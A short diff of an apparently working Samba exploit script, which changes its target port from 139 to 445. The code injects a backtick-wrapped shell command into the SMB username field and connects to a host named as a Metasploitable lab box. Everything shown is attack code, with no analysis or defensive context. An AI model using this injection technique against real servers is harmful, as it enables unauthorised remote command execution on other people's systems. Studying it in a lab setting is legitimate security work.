@@ -39,4 +39,4 @@ buf += "\x20"
 username = "/=`nohup " + buf + "`"
 password = ""
 conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
-assert conn.connect(sys.argv[1], 139)
+assert conn.connect(sys.argv[1], 445)
